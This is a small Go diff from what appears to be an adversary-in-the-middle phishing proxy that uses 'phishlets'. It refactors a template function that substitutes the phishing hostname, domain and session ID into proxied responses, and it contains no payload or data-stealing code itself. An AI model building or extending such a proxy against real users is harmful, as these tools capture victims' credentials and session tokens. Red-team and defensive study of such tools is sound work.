@@ -76,15 +76,17 @@ func replaceBody(resp *http.Response, bodyBytes []byte) {
 }
 
 func expandTemplate(tmpl string, ctx *aitm.ProxyContext) string {
-	result := tmpl
+	var pairs []string
 	if ctx.Phishlet != nil {
-		result = strings.ReplaceAll(result, "{hostname}", ctx.Phishlet.Hostname)
-		result = strings.ReplaceAll(result, "{domain}", ctx.Phishlet.BaseDomain)
+		pairs = append(pairs, "{hostname}", ctx.Phishlet.Hostname, "{domain}", ctx.Phishlet.BaseDomain)
 	}
 	if ctx.Session != nil {
-		result = strings.ReplaceAll(result, "{session_id}", ctx.Session.ID)
+		pairs = append(pairs, "{session_id}", ctx.Session.ID)
 	}
-	return result
+	if len(pairs) == 0 {
+		return tmpl
+	}
+	return strings.NewReplacer(pairs...).Replace(tmpl)
 }
 
 var _ proxy.ResponseHandler = (*SubFilterApplier)(nil)
